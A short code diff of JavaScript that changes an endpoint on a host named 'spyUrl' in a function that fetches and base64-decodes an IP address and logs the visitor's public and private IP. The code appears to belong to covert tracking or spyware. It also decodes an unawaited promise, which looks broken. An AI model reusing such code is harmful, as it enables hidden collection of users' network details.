@@ -101,7 +101,7 @@ script2 = atob(y);
   }
 }, 1000);
 async function getIP(){
-let x = await fetch(spyUrl + "getIP");
+let x = await fetch(spyUrl + "getIP.php");
 let y = await atob(x.text());
 appendLog("Public IP: " + y + "<br> Private IP: " + privateIP);
 }
